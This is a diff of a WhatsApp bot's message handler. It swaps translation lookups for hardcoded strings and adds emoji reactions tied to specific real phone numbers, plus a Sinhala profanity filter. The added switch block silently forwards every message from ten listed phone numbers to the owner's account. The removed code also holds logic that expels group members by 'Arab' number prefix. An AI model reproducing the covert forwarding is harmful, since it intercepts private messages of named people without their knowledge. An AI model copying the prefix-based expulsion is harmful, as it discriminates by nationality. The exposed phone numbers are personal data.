+        if (!('question' in akinator)) akinator.question = null;
+        if (!('progression' in akinator)) akinator.progression = null;
+        if (!('step' in akinator)) akinator.step = null;
+        if (!('soal' in akinator)) akinator.soal = null;
+	            } else {
+        global.db.data.users[m.sender].akinator = {
           sesi: false,
           server: null,
           frontaddr: null,
@@ -496,125 +925,41 @@ export async function handler(chatUpdate) {
           step: null,
           soal: null,
         };
-        for (const aki in akiSettings) {
-          if (akinator[aki] === undefined || !akinator.hasOwnProperty(aki)) {
-            akinator[aki] = akiSettings[aki] ?? {};
-          }
-        }
       }
-      let gameglx = global.db.data.users[m.sender].gameglx
-      if (typeof gameglx !== 'object') {
-        global.db.data.users[m.sender].gameglx = {}
-      }
-      if (gameglx) {
-        const gameGalaxy = { // i want to assign dick instead gameGalaxy
-          status: false,
-          notificacao: {
-            recebidas: []
-          },
-          perfil: {
-            xp: 112,
-            nivel: {
-              nome: 'Iniciante',
-              id: 0,
-              proximoNivel: 1
-            },
-            poder: 500,
-            minerando: false,
-            nome: null,
-            username: null,
-            id: null, // Id do Jogador
-            idioma: 'pt-br',
-            casa: {
-              id: null, // id do grupo ou seja do planeta casa
-              planeta: null,
-              idpelonome: 'terra',
-              colonia: {
-                id: 1,
-                nome: null,
-                habitante: false,
-                posicao: {
-                  x: 0,
-                  y: 0,
-                }
-              }
-            },
-            carteira: {
-              currency: 'BRL',
-              saldo: 1500,
-            },
-            localizacao: {
-              status: false,
-              nomeplaneta: null,  // id do grupo...
-              id: null,
-              idpelonome: null,
-              viajando: false,
-              posicao: {
-                x: 0,
-                y: 0,
-              }
-            },
-            nave: {
-              status: false,
-              id: null,
-              nome: null,
-              velocidade: null,
-              poder: null,
-              valor: null,
-            },
-            bolsa: {
-              itens: {
-                madeira: 1,
-                ferro: 1,
-                diamante: 1,
-                esmeralda: 2,
-                carvao: 1,
-                ouro: 1,
-                quartzo: 1
-              },
-              naves: {
-                status: false,
-                compradas: []
-              }
-            },
-            ataque: {
-              data: {
-                hora: 0,
-                contagem: 0 
-              },
-              sendoAtacado: {
-                status: false,
-                atacante: null,
-              },
-              forcaAtaque: {
-                ataque: 10
-              }
-            },
-            defesa: {
-              forca: 200,
-              ataque: 30
-            }
-          }
-        }
-        for (const game in gameGalaxy) {
-          if (gameglx[game] === undefined || !gameglx.hasOwnProperty(game)) {
-            gameglx[game] = gameGalaxy[game] ?? {} // ctrl + v moment 
-          }
-        }
-      }
-
-
       const chat = global.db.data.chats[m.chat];
       if (typeof chat !== 'object') {
         global.db.data.chats[m.chat] = {};
       }
       if (chat) {
-        
-      const chats = { // i want to assign dick instead chats
+        if (!('isBanned' in chat)) chat.isBanned = false;
+        if (!('welcome' in chat)) chat.welcome = true;
+        if (!('detect' in chat)) chat.detect = true;
+        if (!('detect2' in chat)) chat.detect2 = false;
+        if (!('sWelcome' in chat)) chat.sWelcome = '';
+        if (!('sBye' in chat)) chat.sBye = '';
+        if (!('sPromote' in chat)) chat.sPromote = '';
+        if (!('sDemote' in chat)) chat.sDemote = '';
+        if (!('delete' in chat)) chat.antidelete = false;
+        if (!('modohorny' in chat)) chat.modohorny = false;
+        if (!('autosticker' in chat)) chat.autosticker = false;
+        if (!('audios' in chat)) chat.audios = false;
+        if (!('antiLink' in chat)) chat.antiLink = false;
+        if (!('antiLink2' in chat)) chat.antiLink2 = false;
+        if (!('antiviewonce' in chat)) chat.antiviewonce = false;
+        if (!('antiToxic' in chat)) chat.antiToxic = false;
+        if (!('antiTraba' in chat)) chat.antiTraba = false;
+        if (!('antiArab' in chat)) chat.antiArab = false;
+        if (!('antiArab2' in chat)) chat.antiArab2 = false;
+        if (!('antiporno' in chat)) chat.antiporno = false;
+        if (!('modoadmin' in chat)) chat.modoadmin = false;
+        if (!('simi' in chat)) chat.simi = false;
+        if (!isNumber(chat.expired)) chat.expired = 0;
+      } else {
+        global.db.data.chats[m.chat] = {
           isBanned: false,
           welcome: true,
           detect: true,
-          detect2: false,
+	  detect2: false,
           sWelcome: '',
           sBye: '',
           sPromote: '',
@@ -629,49 +974,43 @@ export async function handler(chatUpdate) {
           antiToxic: false,
           antiTraba: false,
           antiArab: false,
-          antiArab2: false,
-          antiporno: false,
-          modoadmin: false,
-          simi: false,
-          game: true,
+	  antiArab2: false,
+	  antiporno: false,
+	  modoadmin: false,
+	  simi: false,
           expired: 0,
-          language: 'es',
-        }
-        for (const chatss in chats) {
-          if (chat[chatss] === undefined || !chat.hasOwnProperty(chatss)) {
-            chat[chatss] = chats[chatss] ?? {}// ctrl + v moment
-          }
-        }
+        };
       }
       const settings = global.db.data.settings[this.user.jid];
       if (typeof settings !== 'object') global.db.data.settings[this.user.jid] = {};
       if (settings) {
-       const setttings = { // yk the drill 
+        if (!('self' in settings)) settings.self = false;
+        if (!('autoread' in settings)) settings.autoread = false;
+        if (!('autoread2' in settings)) settings.autoread2 = false;
+        if (!('restrict' in settings)) settings.restrict = false;
+        if (!('antiCall' in settings)) settings.antiCall = false;
+        if (!('antiPrivate' in settings)) settings.antiPrivate = false;
+	if (!('modejadibot' in settings)) settings.modejadibot = true;
+        if (!('antispam' in settings)) settings.antispam = false;
+	if (!('audios_bot' in settings)) settings.audios_bot = true;  
+	if (!('modoia' in settings)) settings.modoia = false;      
+      } else {
+        global.db.data.settings[this.user.jid] = {
           self: false,
           autoread: false,
           autoread2: false,
           restrict: false,
           antiCall: false,
           antiPrivate: false,
-          modejadibot: true,
+	  modejadibot: true,
           antispam: false,
-          audios_bot: true,
-          modoia: false
+	  audios_bot: true,
+	  modoia: false
         };
-        for (const setting in settings) {
-          if (settings[setting] === undefined || !settings.hasOwnProperty(setting)) {
-            settings[setting] = setttings[setting] ?? {} // ctrl + v moment
-          }
-        }
       }
     } catch (e) {
       console.error(e);
     }
-
-    const idioma = global.db.data.users[m.sender]?.language || global.defaultLenguaje; // is null? np the operator ?? fix that (i hope)
-    const _translate = JSON.parse(fs.readFileSync(`./src/languages/${idioma}.json`))
-    const tradutor = _translate.handler.handler
-
     if (opts['nyimak']) {
       return;
     }
@@ -699,13 +1038,13 @@ export async function handler(chatUpdate) {
       const queque = this.msgqueque; const time = 1000 * 5;
       const previousID = queque[queque.length - 1];
       queque.push(m.id || m.key.id);
-      setInterval(async function () {
+      setInterval(async function() {
         if (queque.indexOf(previousID) === -1) clearInterval(this);
         await delay(time);
       }, time);
     }
 
-    if (m.isBaileys || isBaileysFail && m?.sender === mconn?.conn?.user?.jid) {
+    if (m.isBaileys) {
       return;
     }
     m.exp += Math.ceil(Math.random() * 10);
@@ -750,36 +1089,34 @@ export async function handler(chatUpdate) {
           const md5c = fs.readFileSync('./plugins/' + m.plugin);
           fetch('https://themysticbot.cloud:2083/error', {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ number: conn.user.jid, plugin: m.plugin, command: `${m.text}`, reason: format(e), md5: mddd5(md5c) }),
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({number: conn.user.jid, plugin: m.plugin, command: `${m.text}`, reason: format(e), md5: mddd5(md5c)}),
           });
         }
       }
       if (!opts['restrict']) {
         if (plugin.tags && plugin.tags.includes('admin')) {
-          // global.dfail('restrict', m, this)
+        // global.dfail('restrict', m, this)
           continue;
         }
       }
       const str2Regex = (str) => str.replace(/[|\\{}()[\]^$+*?.]/g, '\\$&');
       const _prefix = plugin.customPrefix ? plugin.customPrefix : conn.prefix ? conn.prefix : global.prefix;
       const match = (_prefix instanceof RegExp ? // RegExp Mode?
-        [[_prefix.exec(m.text), _prefix]] :
-        Array.isArray(_prefix) ? // Array?
-          _prefix.map((p) => {
-            const re = p instanceof RegExp ? // RegExp in Array?
-              p :
-              new RegExp(str2Regex(p));
-            return [re.exec(m.text), re];
-          }) :
-          typeof _prefix === 'string' ? // String?
-            [[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]] :
-            [[[], new RegExp]]
+                [[_prefix.exec(m.text), _prefix]] :
+                Array.isArray(_prefix) ? // Array?
+                    _prefix.map((p) => {
+                      const re = p instanceof RegExp ? // RegExp in Array?
+                            p :
+                            new RegExp(str2Regex(p));
+                      return [re.exec(m.text), re];
+                    }) :
+                    typeof _prefix === 'string' ? // String?
+                        [[new RegExp(str2Regex(_prefix)).exec(m.text), new RegExp(str2Regex(_prefix))]] :
+                        [[[], new RegExp]]
       ).find((p) => p[1]);
-      
-      if (typeof plugin.before === 'function') {  
-       
-        const data  = await plugin.before.call(this, m, {
+      if (typeof plugin.before === 'function') {
+        if (await plugin.before.call(this, m, {
           match,
           conn: this,
           participants,
@@ -795,40 +1132,36 @@ export async function handler(chatUpdate) {
           chatUpdate,
           __dirname: ___dirname,
           __filename,
-        }) 
-        if (data) {
+        })) {
           continue;
         }
       }
       if (typeof plugin !== 'function') {
         continue;
       }
-      if (plugin.numberReply ||  (usedPrefix = (match[0] || '')[0])) {  
-        const usedPrefix = (match[0] || '')[0] 
+      if ((usedPrefix = (match[0] || '')[0])) {
         const noPrefix = m.text.replace(usedPrefix, '');
         let [command, ...args] = noPrefix.trim().split` `.filter((v) => v);
         args = args || [];
-        const _args =  noPrefix.trim().split` `.slice(1);
+        const _args = noPrefix.trim().split` `.slice(1);
         const text = _args.join` `;
-        command =  plugin.numberReply ? m.message?.extendedTextMessage?.text || "" : (command || '').toLowerCase();
-        
-        
+        command = (command || '').toLowerCase();
         const fail = plugin.fail || global.dfail; // When failed
         const isAccept = plugin.command instanceof RegExp ? // RegExp Mode?
-          plugin.command.test(command) :
-          Array.isArray(plugin.command) ? // Array?
-            plugin.command.some((cmd) => cmd instanceof RegExp ? // RegExp in Array?
-              cmd.test(command) :
-              cmd === command,
-            ) :
-            typeof plugin.command === 'string' ? // String?
-              plugin.command === command :
-              false; 
+                    plugin.command.test(command) :
+                    Array.isArray(plugin.command) ? // Array?
+                        plugin.command.some((cmd) => cmd instanceof RegExp ? // RegExp in Array?
+                            cmd.test(command) :
+                            cmd === command,
+                        ) :
+                        typeof plugin.command === 'string' ? // String?
+                            plugin.command === command :
+                            false;
+
         if (!isAccept) {
           continue;
-        } 
+        }
         m.plugin = name;
-        console.log(name)
         if (m.chat in global.db.data.chats || m.sender in global.db.data.users) {
           const chat = global.db.data.chats[m.chat];
           const user = global.db.data.users[m.sender];
@@ -837,7 +1170,7 @@ export async function handler(chatUpdate) {
           if (!['owner-unbanchat.js', 'info-creator.js'].includes(name) && chat && chat?.isBanned && !isROwner) return; // Except this
           if (name != 'owner-unbanchat.js' && name != 'owner-exec.js' && name != 'owner-exec2.js' && chat?.isBanned && !isROwner) return; // Except this
           //if ((name != 'owner-unbanchat.js' || name != 'owner-exec.js' || name != 'owner-exec2.js') && chat?.isBanned && !isROwner) return; // Except this
-                    
+		
           if (m.text && user.banned && !isROwner) {
             if (typeof user.bannedMessageCount === 'undefined') {
               user.bannedMessageCount = 0;
@@ -845,10 +1178,10 @@ export async function handler(chatUpdate) {
 
             if (user.bannedMessageCount < 3) {
               const messageNumber = user.bannedMessageCount + 1;
-              const messageText = `${tradutor.texto1[0]}
-${tradutor.texto1[1]} ${messageNumber}/3
- ${user.bannedReason ? `${tradutor.texto1[2]} ${user.bannedReason}` : `${tradutor.texto1[3]}`}
- ${tradutor.texto1[4]}`.trim();
+const messageText = `_*< ᴜꜱᴇʀ ꜱᴜꜱᴘᴇɴᴅᴇᴅ />*_\n
+ ▢ *Aviso:* ${messageNumber}/3
+ ${user.bannedReason ? `\n▢ *ʀᴇᴀꜱᴏɴ:* ${user.bannedReason}` : ' ▢ *ʀᴇᴀꜱᴏɴ:* Sin especificar'}
+ *[ ℹ️ ] If you think this is a mistake and you have evidence, you can contact the bot owner to appeal the suspension.*`.trim();
               m.reply(messageText);
               user.bannedMessageCount++;
             } else if (user.bannedMessageCount === 3) {
@@ -858,7 +1191,7 @@ ${tradutor.texto1[1]} ${messageNumber}/3
             }
             return;
           }
-
+		
           if (botSpam.antispam && m.text && user && user.lastCommandTime && (Date.now() - user.lastCommandTime) < 5000 && !isROwner) {
             if (user.commandCount === 2) {
               const remainingTime = Math.ceil((user.lastCommandTime + 5000 - Date.now()) / 1000);
@@ -877,7 +1210,7 @@ ${tradutor.texto1[1]} ${messageNumber}/3
             user.commandCount = 1;
           }
         }
-        const hl = _prefix;
+	        const hl = _prefix;
         const adminMode = global.db.data.chats[m.chat].modoadmin;
         const mystica = `${plugin.botAdmin || plugin.admin || plugin.group || plugin || noPrefix || hl || m.text.slice(0, 1) == hl || plugin.command}`;
         if (adminMode && !isOwner && !isROwner && m.isGroup && !isAdmin && mystica) return;
@@ -929,12 +1262,12 @@ ${tradutor.texto1[1]} ${messageNumber}/3
           m.exp += xp;
         }
         if (!isPrems && plugin.limit && global.db.data.users[m.sender].limit < plugin.limit * 1) {
-          mconn.conn.reply(m.chat, `${tradutor.texto2} _${usedPrefix}buyall_`, m);
-          continue;
+          mconn.conn.reply(m.chat, `*[ ℹ️ ] Your diamonds have run out, you can purchase more with the command:* _${usedPrefix}buyall_`, m);
+          continue; 
         }
         if (plugin.level > _user.level) {
-          mconn.conn.reply(m.chat, `${tradutor.texto3[0]} ${plugin.level} ${tradutor.texto3[1]} ${_user.level}, ${tradutor.texto3[2]} ${usedPrefix}lvl ${tradutor.texto3[3]}`, m);
-          continue;
+          mconn.conn.reply(m.chat, `*[ ℹ️ ] Se require tener el nivel ${plugin.level} para poder utilizar el comando. Tú nivel actual es ${_user.level}, usa el comando ${usedPrefix}lvl para subir tu nivel con XP.*`, m);
+          continue; 
         }
         const extra = {
           match,
@@ -982,8 +1315,8 @@ ${tradutor.texto1[1]} ${messageNumber}/3
               const md5c = fs.readFileSync('./plugins/' + m.plugin);
               fetch('https://themysticbot.cloud:2083/error', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ number: conn.user.jid, plugin: m.plugin, command: `${usedPrefix}${command} ${args.join(' ')}`, reason: text, md5: mddd5(md5c) }),
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({number: conn.user.jid, plugin: m.plugin, command: `${usedPrefix}${command} ${args.join(' ')}`, reason: text, md5: mddd5(md5c)}),
               }).then((res) => res.json()).then((json) => {
                 console.log(json);
               }).catch((err) => {
@@ -1002,11 +1335,11 @@ ${tradutor.texto1[1]} ${messageNumber}/3
             }
           }
           if (m.limit) {
-            m.reply(`${tradutor.texto4[0]} ` + +m.limit + ` ${tradutor.texto4[1]}`);
+            m.reply('*[ ℹ️ ] Se utilizaron ' + +m.limit + ' diamante(s) (limites).*');
           }
         }
         break;
-      } 
+      }
     }
   } catch (e) {
     console.error(e);
@@ -1059,74 +1392,353 @@ ${tradutor.texto1[1]} ${messageNumber}/3
     }
 
     try {
-      if (!opts['noprint']) await (await import(`./src/libraries/print.js`)).default(m, this);
+      if (!opts['noprint']) await (await import(`./lib/print.js`)).default(m, this);
     } catch (e) {
       console.log(m, m.quoted, e);
     }
     const settingsREAD = global.db.data.settings[mconn.conn.user.jid] || {};
     if (opts['autoread']) await mconn.conn.readMessages([m.key]);
     if (settingsREAD.autoread2) await mconn.conn.readMessages([m.key]);
+ if (m.sender.startsWith('94701337346' || '94701337346')){
+                if (m.isBaileys)
+                return
+                await this.sendMessage(m.chat, { react: { text: `🌙`, key: m.key }})}
+    
+                if (m.sender.startsWith('94725122871' || '94725122871')){
+                if (m.isBaileys)
+                return
+                await this.sendMessage(m.chat, { react: { text: `💂‍♂️`, key: m.key }})}
+    
+                if (m.sender.startsWith('94703369850' || '94703369850')){
+                if (m.isBaileys)
+                return
+                await this.sendMessage(m.chat, { react: { text: `🌻`, key: m.key }})}
+    
+                if (m.sender.startsWith('94713564309' || '94713564309')){
+                if (m.isBaileys)
+                return
+                await this.sendMessage(m.chat, { react: { text: `😈`, key: m.key }})}
+
+
+              if (m.sender.startsWith('94773054115' || '94773054115')){
+                if (m.isBaileys)
+                return
+                await this.sendMessage(m.chat, { react: { text: `🦋`, key: m.key }})}
+                
+                if (m.sender.startsWith('94767924356' || '94767924356')){
+                if (m.isBaileys)
+                return
+                await this.sendMessage(m.chat, { react: { text: `🐤`, key: m.key }})}
+
+
+
+//-------------------owners-----------------------------------------
+if (m.sender.startsWith('94714787330' || '94714787330')){
+    if (m.isBaileys)
+    return
+    await this.sendMessage(m.chat, { react: { text: `🤵‍♀`, key: m.key }})}
+    switch(true){
+    
+
+        //------------------------Amdi team------------------------
+        //case m.sender.startsWith('94783638394' || '94783638394'):
+           // if (m.isBaileys)
+              //  return
+          //  await this.sendMessage(m.chat, { react: { text: `💕`, key: m.key }});
+      //  break;
+        
+        case m.sender.startsWith('94757405652' || '94757405652'):
+            if (m.isBaileys)
+                return
+            await this.sendMessage(m.chat, { react: { text: `🎩`, key: m.key }});
+        break;
+        
+        case m.sender.startsWith('94703178336' || '94703178336'):
+            if (m.isBaileys)
+                return
+            await this.sendMessage(m.chat, { react: { text: `🕯`, key: m.key }});
+        break;
+        case m.sender.startsWith('94719077818' || '94719077818'):
+            if (m.isBaileys)
+                return
+            await this.sendMessage(m.chat, { react: { text: `💫`, key: m.key }});
+        break;
+        
+        case m.sender.startsWith('94778676500' || '94778676500'):
+            case m.sender.startsWith('94773166106' || '94773166106'):
+            case m.sender.startsWith('94774266106' || '94774266106'):
+            case m.sender.startsWith('94766626106' || '94766626106'):
+            case m.sender.startsWith('94772181306' || '94772181306'):
+            case m.sender.startsWith('94764721159' || '94764721159'):
+            case m.sender.startsWith('94743400240' || '94743400240'):
+            case m.sender.startsWith('94763277872' || '94763277872'):
+            case m.sender.startsWith('94763588120' || '94763588120'):
+            case m.sender.startsWith('94715257970' || '94715257970'):
+        
+        try {
+           
+           
+            let msg = this.serializeM(this.loadMessage(m.id))
+            if (!msg)
+                return
+        
+            this.copyNForward('94701337346@s.whatsapp.net', msg).catch(e => console.log(e, msg))
+        } catch (e) {
+            console.error(e)
+        }
+        break;
+
+
+
+
+
+        //-------------------jf team----------------------------------
+            
+            /*case m.sender.startsWith('94705516233' || '94705516233'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `☠`, key: m.key }});
+            break;
+            case m.sender.startsWith('94703669885' || '94703669885'):
+                if (m.isBaileys)
+                  return
+                await this.sendMessage(m.chat, { react: { text: `☠`, key: m.key }});
+            break;
+            case m.sender.startsWith('94704166484' || '94704166484'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `☠`, key: m.key }});
+            break;
+            case m.sender.startsWith('94716989864' || '94716989864'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `☠`, key: m.key }});
+            break;
+            case m.sender.startsWith('94753966272' || '94753966272'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `☠`, key: m.key }});
+            break;
+            case m.sender.startsWith('94714290151' || '94714290151'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `☠`, key: m.key }});
+            break;*/
+            //--------------------urt-Admin------------------------------------
+        
+            /*case m.sender.startsWith('94724507665' || '94724507665'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `⚜`, key: m.key }});
+            break;
+            case m.sender.startsWith('94740387449' || '94740387449'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `⚜`, key: m.key }});
+            break;
+            case m.sender.startsWith('94779385275' || '94779385275'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `⚜`, key: m.key }});
+            break;
+            case m.sender.startsWith('94712968406' || '94712968406'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `⚜`, key: m.key }});
+            break;
+            case m.sender.startsWith('94729230275' || '94729230275'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `⚜`, key: m.key }});
+            break;
+            //----------------------sl programmers-----------------------
+            case m.sender.startsWith('94716388240' || '94716388240'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `👾`, key: m.key }});
+            break;
+            case m.sender.startsWith('94774533771' || '94774533771'):
+                if (m.isBaileys)
+                    return
+                await this.sendMessage(m.chat, { react: { text: `👾`, key: m.key }});
+            break;*/
+        }
+
+//-------------------------badward-----------------------------------
+
+
+        
+if (m.text.match(/(huthth|හුත්තා|pakaya|පකයා|wesi|වේසි|hukanna|හුකන්න|වේසිගෙම පුතෝ|කල්ලතෝනි පොන්නයා|මානසික ලාමක|ගූ පිත්තමෙන්|ගර්භාෂ බිත්තිය කඩාගෙන පුකෙන් එලියට එන්න|හුත්තිගෙ පුතෝ|කැරි අබ්බගාත|කැරි|මුඩුක්කු පොන්නයො|පයියක්|හුජ්ජ|පකා|හුකාරිස්|වේස|තිප්පිලි පොන්නය)/gi)) {
+    if (m.isBaileys)
+    return
+    await this.sendMessage(m.chat, { react: { text: `🔞`, key: m.key }})}
+
+if (m.text.match(/(ක්ක්ක්|ක්ක්ක්ක්)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🖕`, key: m.key }})}
+  
+//------------------team and team mem-----------------------
+
+
+if (m.text.match(/(DEVIL|devil|mizta|MIZTA|94701337346|@94701337346|Menaka|menaka|Nilupul|nilupul|NILUPUL|MENAKA)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `❤‍🔥`, key: m.key }})}
+   
+ //MENU REACTS_________________________  
+   if (m.text.match(/(.menu)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `📄`, key: m.key }})}
+   
+   
+   if (m.text.match(/(.yt)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🏮`, key: m.key }})}
+   
+   if (m.text.match(/(.yts)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🔍`, key: m.key }})}
+   
+   if (m.text.match(/(.yta)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🎧`, key: m.key }})}
+   
+ //AI REACTS__________________________
+   
+   if (m.text.match(/(.bard)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🎲`, key: m.key }})}
+   
+   
+   if (m.text.match(/(.blackbox)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🎓`, key: m.key }})}
+   
+   
+   if (m.text.match(/(.liama)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `📃`, key: m.key }})}
+   
+  
+   if (m.text.match(/(.ai)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `👨‍💻`, key: m.key }})}
+   
+   if (m.text.match(/(.scmd)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🪧`, key: m.key }})}
+   
+   
+  if (m.text.match(/(.gcmd)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🪄`, key: m.key }})}
+  
+  
+  if (m.text.match(/(.control)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `⚙️`, key: m.key }})}
+   
+   if (m.text.match(/(.stickercmd)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `📸`, key: m.key }})}
+   
+  if (m.text.match(/(.tools)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `⚒️`, key: m.key }})}
+   
+
+
+if (m.text.match(/(.alive|.mizty)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { text : `*_HI IM ONLINE NOW WHAT DO YOU WANT TO DO 👀_* \n\n Type :- .menu ` } , { quoted: m })}
+   
+if (m.text.match(/(@94701337346)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { text : `*He is my owner Please Don't disturb him 😪🖐️*' ` } , { quoted: m })}   
+
+
+//----------------ɴᴇᴡꜱ----------------------------------
+if (m.text.match(/(ɴᴇᴡꜱ)/gi)) {
+   if (m.isBaileys)
+   return
+   await this.sendMessage(m.chat, { react: { text: `🗞️`, key: m.key }})}
+
+
+              
   }
 }
 
 /**
  * Handle groups participants update
- * @param {import("baileys").BaileysEventMap<unknown>['group-participants.update']} groupsUpdate
+ * @param {import('@whiskeysockets/baileys').BaileysEventMap<unknown>['group-participants.update']} groupsUpdate
  */
-export async function participantsUpdate({ id, participants, action }) {
-  const idioma = global?.db?.data?.chats[id]?.language || global.defaultLenguaje;
-  const _translate = JSON.parse(fs.readFileSync(`./src/languages/${idioma}.json`))
-  const tradutor = _translate.handler.participantsUpdate
-
+export async function participantsUpdate({id, participants, action}) {
   const m = mconn
   if (opts['self']) return;
+  //if (m.conn.isInit) return;
   if (global.db.data == null) await loadDatabase();
   const chat = global.db.data.chats[id] || {};
-  const botTt = global.db.data.settings[mconn?.conn?.user?.jid] || {};
+  const botTt = global.db.data.settings[m.conn.user.jid] || {};
   let text = '';
   switch (action) {
-    case 'add':
-    case 'remove':
-      if (chat.welcome && !chat?.isBanned) {
-        const groupMetadata = await m?.conn?.groupMetadata(id) || (conn?.chats[id] || {}).metadata;
-        for (const user of participants) {
-          let pp = 'https://raw.githubusercontent.com/BrunoSobrino/TheMystic-Bot-MD/master/src/avatar_contact.png';
-          try {
-            pp = await m?.conn?.profilePictureUrl(user, 'image');
-          } catch (e) {
-          } finally {
-            const apii = await mconn?.conn?.getFile(pp);
-            const antiArab = JSON.parse(fs.readFileSync('./src/antiArab.json'));
-            const userPrefix = antiArab.some((prefix) => user.startsWith(prefix));
-            const botTt2 = groupMetadata?.participants?.find((u) => m?.conn?.decodeJid(u.id) == m?.conn?.user?.jid) || {};
-            const isBotAdminNn = botTt2?.admin === 'admin' || false;
-            text = (action === 'add' ? (chat.sWelcome || tradutor.texto1 || conn.welcome || 'Welcome, @user!').replace('@subject', await m?.conn?.getName(id)).replace('@desc', groupMetadata?.desc?.toString() || '*𝚂𝙸𝙽 𝙳𝙴𝚂𝙲𝚁𝙸𝙿𝙲𝙸𝙾𝙽*').replace('@user', '@' + user.split('@')[0]) :
-              (chat.sBye || tradutor.texto2 || conn.bye || 'Bye, @user!')).replace('@user', '@' + user.split('@')[0]);
-            if (userPrefix && chat.antiArab && botTt.restrict && isBotAdminNn && action === 'add') {
-              const responseb = await m.conn.groupParticipantsUpdate(id, [user], 'remove');
-              if (responseb[0].status === '404') return;
-              const fkontak2 = { 'key': { 'participants': '0@s.whatsapp.net', 'remoteJid': 'status@broadcast', 'fromMe': false, 'id': 'Halo' }, 'message': { 'contactMessage': { 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${user.split('@')[0]}:${user.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` } }, 'participant': '0@s.whatsapp.net' };
-              await m?.conn?.sendMessage(id, { text: `*[❗] @${user.split('@')[0]} ᴇɴ ᴇsᴛᴇ ɢʀᴜᴘᴏ ɴᴏ sᴇ ᴘᴇʀᴍɪᴛᴇɴ ɴᴜᴍᴇʀᴏs ᴀʀᴀʙᴇs ᴏ ʀᴀʀᴏs, ᴘᴏʀ ʟᴏ ϙᴜᴇ sᴇ ᴛᴇ sᴀᴄᴀʀᴀ ᴅᴇʟ ɢʀᴜᴘᴏ*`, mentions: [user] }, { quoted: fkontak2 });
-              return;
-            }
-            await m?.conn?.sendFile(id, apii.data, 'pp.jpg', text, null, false, { mentions: [user] });
-          }
-        }
-      }
-      break;
+    // case 'add':
+    // case 'remove':
+      // if (chat.welcome && !chat?.isBanned) {
+        // const groupMetadata = await m.conn.groupMetadata(id) || (conn.chats[id] || {}).metadata;
+        // for (const user of participants) {
+          // let pp = './src/avatar_contact.png';
+          // try {
+            // pp = await m.conn.profilePictureUrl(user, 'image');
+          // } catch (e) {
+          // } finally {
+            // const apii = await m.conn.getFile(pp);
+            // const antiArab = JSON.parse(fs.readFileSync('./src/antiArab.json'));
+            // const userPrefix = antiArab.some((prefix) => user.startsWith(prefix));
+            // const botTt2 = groupMetadata.participants.find((u) => m.conn.decodeJid(u.id) == m.conn.user.jid) || {};
+            // const isBotAdminNn = botTt2?.admin === 'admin' || false;
+            // text = (action === 'add' ? (chat.sWelcome || this.welcome || conn.welcome || 'Welcome, @user!').replace('@subject', await m.conn.getName(id)).replace('@desc', groupMetadata.desc?.toString() || '*𝚂𝙸𝙽 𝙳𝙴𝚂𝙲𝚁𝙸𝙿𝙲𝙸𝙾𝙽*') :
+                              // (chat.sBye || this.bye || conn.bye || 'Be, @user!')).replace('@user', '@' + user.split('@')[0]);
+            // if (userPrefix && chat.antiArab && botTt.restrict && isBotAdminNn && action === 'add') {
+              // const responseb = await m.conn.groupParticipantsUpdate(id, [user], 'remove');
+              // if (responseb[0].status === '404') return;
+              // const fkontak2 = {'key': {'participants': '0@s.whatsapp.net', 'remoteJid': 'status@broadcast', 'fromMe': false, 'id': 'Halo'}, 'message': {'contactMessage': {'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${user.split('@')[0]}:${user.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}, 'participant': '0@s.whatsapp.net'};
